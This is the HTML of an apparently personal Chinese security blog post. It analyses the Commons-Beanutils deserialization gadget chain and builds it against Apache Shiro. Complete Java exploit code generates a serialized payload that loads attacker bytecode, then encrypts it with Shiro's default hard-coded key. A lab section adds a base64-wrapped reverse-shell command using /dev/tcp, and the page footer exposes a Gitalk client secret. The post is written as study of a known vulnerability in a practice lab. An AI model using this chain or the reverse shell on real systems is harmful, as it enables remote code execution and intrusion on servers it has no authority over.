@@ -1,0 +1,562 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Shiro无依赖链—Commons Beanutils | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Shiro无依赖链—Commons Beanutils | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="前言
+前面学习了CC6在Shiro当中的应用，但是很多场景没有使用CC依赖，那么还有其他利用方式吗?那就是Commons Beanutils！
+Commons Beanutils是什么？
+Commons-Beanutils是Apache提供..." />
+    <meta name="keywords" content="Java,Shiro,Commons Beanutils" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Shiro无依赖链—Commons Beanutils
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-21
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/u4AbpM3qf1/" class="post-tag">
+                  # Shiro
+                </a>
+              
+                <a href="https://le1a.github.io/tag/vzOkSStZept/" class="post-tag">
+                  # Commons Beanutils
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>前面学习了CC6在Shiro当中的应用，但是很多场景没有使用CC依赖，那么还有其他利用方式吗?那就是<code>Commons Beanutils</code>！</p>
+<h3 id="commons-beanutils是什么">Commons Beanutils是什么？</h3>
+<p>Commons-Beanutils是Apache提供的一个用于操作JAVA bean的工具包。里面提供了各种各样的工具类，让我们可以很方便的对bean对象的属性进行各种操作。</p>
+<h3 id="javabean是什么">JavaBean是什么？</h3>
+<p>在Java中，有很多<code>class</code>的定义都符合这样的规范</p>
+<ul>
+<li>若干<code>private</code>实例字段；</li>
+<li>通过<code>public</code>方法来读写实例字段。</li>
+<li>命名要符合规范，符合骆驼式命名法，比如说属性名为<code>abc</code>，那么<code>get</code>方法为<code>public Type getAbc()</code>，<code>set</code>方法为<code>public void setAbc(Type value)</code></li>
+</ul>
+<p>例如:</p>
+<pre><code class="language-java">public class Person {
+
+    private String name;
+    private int age;
+
+    public Person(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    public String getName() {
+        return name;
+    }
+    public void setName(String name) {
+        this.name = name;
+    }
+    public int getAge(){
+        return age;
+    }
+    public void setAge(int age){
+        this.age = age;
+    }
+}
+</code></pre>
+<p>如果读写方法符合这种命名规范，那么这种<code>class</code>被称为<code>JavaBean</code>。</p>
+<p>写一个简单的demo来调用一下getName()</p>
+<pre><code class="language-java">import org.apache.commons.beanutils.PropertyUtils;
+
+public class BeanTest {
+    public static void main(String[] args) throws Exception{
+        Person person = new Person(&quot;Le1a&quot;,20);
+        System.out.println(person.getName());
+    }
+}
+</code></pre>
+<p>但是这样写有一个弊端，因为每一个都要用这种函数调用的方式，在<code>Commons-Beanutils</code>中提供了一种静态方法<code>PropertyUtils#getProperty</code>，可以让使用者直接调用到任意<code>JavaBean</code>对象中的<code>getter</code>方法，这样就能相对动态的去执行。</p>
+<p>这个方法，直接传入一个对象，然后获取这个对象的一个属性值，就会自动的去调用getName()方法。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/3f7721b40d781.png" alt="1647872531022.png" loading="lazy"></figure>
+<p>这也就提供了动态执行代码的点，可能会产生安全问题。</p>
+<h2 id="利用链分析">利用链分析</h2>
+<p>我们下个断点调试一下，走到<code>PropertyUtils#getProperty()</code>,这里它又调用了另一个对象的<code>getProperty()</code>，我们继续跟进</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/58390a48375ea.png" alt="1647873346990.png" loading="lazy"></figure>
+<p>跟进到了<code>PropertyUtilsBean#getProperty()</code>,然后调用了这个<code>getNestedProperty()</code></p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/a3676ec59e203.png" alt="1647873484539.png" loading="lazy"></figure>
+<p>然后跟进到下面有一个判断，这里都不满足，所以最后进入这个getSimpleProperty</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/389286ffb5bc2.png" alt="1647873310191.png" loading="lazy"></figure>
+<p>一直跟进到这里，来看一下我们传的是age，返回的就是set方法和get方法的名字，还返回了Bean的属性值的名字。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/3e329c1973837.png" alt="1647874212066.png" loading="lazy"></figure>
+<p>继续往下走，这里获取到一个<code>Method</code>,也就是那个getAge()方法，我们继续跟进</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/717a9954db477.png" alt="1647874619599.png" loading="lazy"></figure>
+<p>然后下面出现了一个反射调用，对我们传递的对象，来调用一个符合<code>JavaBean</code>格式的get方法，然后就走完了。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/f633498aab160.png" alt="1647874785696.png" loading="lazy"></figure>
+<p>在CC3这条链中，<code>TemplatesImpl</code>中我们提到了<code>getOutputProperties()</code>方法</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/b575f757c853a.png" alt="1647875126810.png" loading="lazy"></figure>
+<p>这个方法调用了<code>newTransformer()</code>，他这个格式是符合JavaBean的格式，如果我们对一个<code>TemplatesImpl</code>对象调用这个<code>getOutputProperties()</code>方法，实际上也可以进行代码执行。这就找到了一个在CB下面的代码执行点，当o1是一个<code>TemplatesImpl</code>对 象，而<code>property</code>的值为<code>outputProperties</code>时，将会自动调用getter，也就是<code>TemplatesImpl#getOutputProperties()</code>方法，触发代码执行</p>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.PropertyUtils;
+
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class BeanTest {
+    public static void main(String[] args) throws Exception{
+        Person person = new Person(&quot;Le1a&quot;,20);
+        //System.out.println(PropertyUtils.getProperty(person,&quot;age&quot;));
+        TemplatesImpl templates = new TemplatesImpl();
+        Class tc = templates.getClass();
+        Field nameFiled = tc.getDeclaredField(&quot;_name&quot;);
+        nameFiled.setAccessible(true);
+        nameFiled.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+
+        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Code\\out\\production\\Code\\ClassLoader\\Hacker.class&quot;));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        
+        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+    }
+}
+</code></pre>
+<p>这段代码就能成功执行<code>Hacker</code>字节码文件里的代码了，前面直接照搬的CC3里面的，这里就成功调用了<code>TemplatesImpl#getOutputProperties()</code>。如果<code>PropertyUtils#getProperty</code>的属性值可控的话，就可以任意执行代码了</p>
+<p>接下来就按照构造反序列化链的思路，去找<code>getProperty()</code>的上层，找到了这里的<code>BeanComparator#compare()</code></p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/21/380c3b0d12a5c.png" alt="1647876814768.png" loading="lazy"></figure>
+<p>这个<code>compare()</code>调用了这个<code>getProperty()</code>，这里是可控的。这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不 为空，则用<code>PropertyUtils.getProperty</code>分别取这两个对象的 this.property 属性，比较属性的值。</p>
+<p>来看一下谁调用了这里的compare()呢?</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/9c4a990db8fe5.png" alt="1647956229916.png" loading="lazy"></figure>
+<p>发现<code>PriorityQueue#siftDownUsingComparator</code>调用了这个<code>BeanComparator#compare()</code></p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/d135468b0f64f.png" alt="1647951866995.png" loading="lazy"></figure>
+<p>继续往上查找哪里调用了这个<code>PriorityQueue#siftDownUsingComparator()</code></p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/9f96b5c1d2082.png" alt="1647956889199.png" loading="lazy"></figure>
+<p>然后找到了<code>PriorityQueue#siftDown()</code>调用了<code>PriorityQueue#siftDownUsingComparator()</code>，然后<code>heapify()</code>又调用了<code>siftDown()</code></p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/f21b7cad1d4ba.png" alt="1647951944602.png" loading="lazy"></figure>
+<p>最后<code>PriorityQueue#readObject()</code>又调用了<code>heapify()</code>，并且对<code>queue</code>数组进行循环反序列化</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/1c517f896ec58.png" alt="1647957234512.png" loading="lazy"></figure>
+<p>完整的调用链:</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/b268c888362e3.png" alt="1647957673134.png" loading="lazy"></figure>
+<h2 id="构造利用链">构造利用链</h2>
+<p>首先还是创建TemplateImpl：</p>
+<pre><code class="language-java">byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Code\\out\\production\\Code\\ClassLoader\\Hacker.class&quot;));
+byte[][] codes = {code};//恶意类
+TemplatesImpl obj = new TemplatesImpl();
+setFieldValue(obj, &quot;_bytecodes&quot;,codes);
+setFieldValue(obj, &quot;_name&quot;, &quot;aaaa&quot;);
+setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+</code></pre>
+<p>然后实例化<code>BeanComparator</code>，BeanComparator 构造函数为空时，默认的 property 就是空：</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/1a10d5615a453.png" alt="1647951604575.png" loading="lazy"></figure>
+<pre><code class="language-java">final BeanComparator comparator = new BeanComparator();
+</code></pre>
+<p>然后用这个comparator实例化优先队列 PriorityQueue ：</p>
+<pre><code class="language-java">final BeanComparator comparator = new BeanComparator();
+final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+// stub data for replacement later
+queue.add(1);
+queue.add(1);
+</code></pre>
+<p>可见，我们添加了两个无害的可以比较的对象进队列中。 如果<code>this.property</code>为空，则直接比较这两个对象。</p>
+<p>这里实际上就是对两个<code>1</code>进行排序，防止初始话的时候出错。后面我们再用反射将 property 的值设置成恶意的<code>outputProperties</code>，用于触发<code>TemplatesImpl#getOutputProperties()</code></p>
+<p>将队列里的两个1中其中一个替换成恶意的 TemplateImpl 对象，另一个替换为随意的一个对象就行(当然也可以都替换为恶意的 TemplateImpl 对象)，因为反序列化的时候，对<code>queue</code>数组进行了循环序列化。</p>
+<pre><code class="language-java">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+setFieldValue(queue, &quot;queue&quot;, new Object[]{obj,obj});
+</code></pre>
+<h2 id="初步commonsbeanutils1利用链">初步CommonsBeanutils1利用链</h2>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+
+public class BeanTest {
+    public static void main(String[] args) throws Exception{
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Code\\out\\production\\Code\\ClassLoader\\Hacker.class&quot;));
+        byte[][] codes = {code};//恶意类
+        //CC3
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;,codes);
+        setFieldValue(obj, &quot;_name&quot;, &quot;aaaa&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        //CB
+        final BeanComparator comparator = new BeanComparator();
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(1);
+        queue.add(1);
+
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
+        // ⽣成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<h2 id="使用cb链攻击shiro">使用CB链攻击Shiro</h2>
+<p>前面学习Shiro550的时候，用到的是<code>TemplatesImpl</code>类改造的CC6来攻击的，但是这种情况必须依靠<code>Commons-Collections</code>依赖，实际场景下，目标可能并没有安装<code>Commons-Collections</code>，但是Shiro是需要依赖<code>Commons-Beanutils</code>。这个时候shiro反序列化漏洞就可以使用<code>CommonsBeanutils</code>链来攻击。</p>
+<p>尝试直接用刚刚的POC来生成<code>payload</code>去打Shiro</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/2d102ff049cbe.png" alt="1647961880361.png" loading="lazy"></figure>
+<p>发现并没有弹出计算器，这是为什么呢？</p>
+<p>原因是没找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于commons-collections。 commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p>
+<p>我们看看哪里用到了<code>ComparableComparator</code>类</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/68f277cd15909.png" alt="1647962433827.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/f9a66dd83fd03.png" alt="1647962319404.png" loading="lazy"></figure>
+<p><code>BeanComparator</code>类中的有参构造器中调用了这个<code>ComparableComparator</code>类。看到这里就蒙圈了，我们利用链调用的是无参构造啊！！</p>
+<pre><code class="language-java">final BeanComparator comparator = new BeanComparator();
+</code></pre>
+<p>为什么这里会调用到有参构造去了呢？原因是因为无参构造方法里面写的<code>this((String)null)</code>，那么相当于就会调用下面那个带参构造方法只不过<code>property</code>为空，当没有显式传入<code>Comparator</code>的情况下，则默认使用<code>ComparableComparator</code></p>
+<p>既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p>
+<ul>
+<li>实现 java.util.Comparator 接口</li>
+<li>实现 java.io.Serializable 接口</li>
+<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
+</ul>
+<p>通过IDEA的功能，我们找到一个<code>CaseInsensitiveComparator</code>，这个<code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了<code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码中，兼容性强，是一个完美替代品！</p>
+<pre><code class="language-java">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER = new CaseInsensitiveComparator();
+private static class CaseInsensitiveComparator
+        implements Comparator&lt;String&gt;, java.io.Serializable {
+    // use serialVersionUID from JDK 1.2.2 for interoperability
+    private static final long serialVersionUID = 8575799808933029326L;
+
+    public int compare(String s1, String s2) {
+        int n1 = s1.length();
+        int n2 = s2.length();
+        int min = Math.min(n1, n2);
+        for (int i = 0; i &lt; min; i++) {
+            char c1 = s1.charAt(i);
+            char c2 = s2.charAt(i);
+            if (c1 != c2) {
+                c1 = Character.toUpperCase(c1);
+                c2 = Character.toUpperCase(c2);
+                if (c1 != c2) {
+                    c1 = Character.toLowerCase(c1);
+                    c2 = Character.toLowerCase(c2);
+                    if (c1 != c2) {
+                        // No overflow because of numeric promotion
+                        return c1 - c2;
+                    }
+                }
+            }
+        }
+        return n1 - n2;
+    }
+
+    /** Replaces the de-serialized object. */
+    private Object readResolve() { return CASE_INSENSITIVE_ORDER; }
+}
+</code></pre>
+<p>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/499c753f8f3bf.png" alt="1647963140532.png" loading="lazy"></figure>
+<pre><code class="language-java">final BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
+</code></pre>
+<p>修改之后生成payload的时候报错了，逆天？！！！</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/7cb9d2deaeda0.png" alt="1647963354798.png" loading="lazy"></figure>
+<p>原因是我们现在使用的是<code>String.CASE_INSENSITIVE_ORDER</code>类，是一个String类型，而我们下面add()传入的是整型<code>1</code>，所以改为字符类型的<code>&quot;1&quot;</code>就解决了。</p>
+<h2 id="最后攻击shiro的利用链">最后攻击Shiro的利用链</h2>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+
+public class CBAttck {
+    public static void main(String[] args) throws Exception{
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\Code\\out\\production\\Code\\ClassLoader\\Hacker.class&quot;));
+        byte[][] codes = {code};//恶意类
+        //CC3
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;,codes);
+        setFieldValue(obj, &quot;_name&quot;, &quot;aaaa&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        //CB
+        BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        byte[] payload= barr.toByteArray();
+        AesCipherService aes = new AesCipherService();
+        byte [] key = Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
+        ByteSource finalpayload = aes.encrypt(payload,key);
+        System.out.println(finalpayload.toString());
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/289b988391280.png" alt="1647963528497.png" loading="lazy"></figure>
+<p>最后成功弹出计算器。</p>
+<h2 id="靶场试验">靶场试验</h2>
+<p>vulfocus靶场开一个Shiro环境，然后把之前的恶意字节类中的<code>calc.exe</code>命令改写为</p>
+<pre><code class="language-bash">bash -c {echo,Base64编码}|{base64,-d}|{bash,-i}//Base64编码为bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1 的base64编码
+</code></pre>
+<p>然后重新生成恶意的字节码文件，然后重新生成payload</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/700fc274e76f9.png" alt="1647964224215.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/34a61edfa0816.png" alt="1647964257519.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/22/1d80b3d67dec8.png" alt="1647964011910.png" loading="lazy"></figure>
+<p>成功反弹Shell！</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a>
+<ul>
+<li><a href="#commons-beanutils%E6%98%AF%E4%BB%80%E4%B9%88">Commons Beanutils是什么？</a></li>
+<li><a href="#javabean%E6%98%AF%E4%BB%80%E4%B9%88">JavaBean是什么？</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">利用链分析</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E9%93%BE">构造利用链</a></li>
+<li><a href="#%E5%88%9D%E6%AD%A5commonsbeanutils1%E5%88%A9%E7%94%A8%E9%93%BE">初步CommonsBeanutils1利用链</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8cb%E9%93%BE%E6%94%BB%E5%87%BBshiro">使用CB链攻击Shiro</a></li>
+<li><a href="#%E6%9C%80%E5%90%8E%E6%94%BB%E5%87%BBshiro%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE">最后攻击Shiro的利用链</a></li>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E8%AF%95%E9%AA%8C">靶场试验</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/TemplatesImpl在Shiro中的利用/">
+              <h3 class="post-title">
+                TemplatesImpl在Shiro中的利用
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
